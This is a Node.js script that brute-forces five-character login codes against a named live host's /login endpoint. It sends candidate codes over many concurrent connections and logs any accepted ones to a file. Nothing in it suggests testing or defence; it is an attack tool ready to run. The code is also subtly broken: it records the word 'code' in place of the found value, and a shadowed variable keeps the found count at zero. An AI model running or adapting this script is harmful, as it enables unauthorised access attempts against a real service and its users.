var request = require('request'),
    randomstring = require("randomstring"),
    fs = require('fs');

var file,
    found = 0,
    counter = 0,
	connections = 20;

// Code Style
var cChars = "0123456789abcdefghijklmnopqrstuvwxyz",
    cLength = 5;

function doCode() {
	counter++;

	code = counter.toString(36);

    while (code.length < cLength) { code = "0" + code; }

    if (counter % 40 === 0) {
        var percentage = counter / Math.pow(cChars.length, cLength) * 100;
        console.log("state: " + percentage + "% | checked: " + counter + " | left: " + (Math.pow(cChars.length, cLength) - counter) + " | found: " + found);
    }

    request({
        url: 'http://new.maxkl.de:8080/login',
        body: "{\"code\": \"" + code + "\"}",
        method: 'POST',
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        }
    }, function(err, response, body) {
        if (err) {
			console.dir("invalid response: " + err);
			counter--;
		}
		else {
	        var found = JSON.parse(body).found;

	        if (found) {
	            console.log("found: " + code);
	            file.write("code" + "\n");
	            found++;
	        }
		}

		doCode();
    });
}

if (process.argv[2] !== undefined && process.argv[3] !== undefined) {
	counter = process.argv[3];
	connections = process.argv[2] - 1;
	var now = new Date();
	var date = now.getYear() + now.getMonth() + now.getDate() + "-" + now.getHours() + now.getMinutes() + now.getSeconds();
	var file = fs.createWriteStream("founds-" + date + "-" + process.pid + ".txt", {
	    flags: 'a',
	    defaultEncoding: 'utf8',
	    fd: null,
	    autoClose: true
	});

	file.write("[" + new Date().toLocaleTimeString() + "]\n");

	for (var i = 1; i <= connections; i++) {
	    doCode();
	}

}
else {
	console.error("Usage: node app.js [connections] [start]");
	console.error("connections: connections at a time [20]");
	console.error("start: start index (useful for several processes) [0]");
}
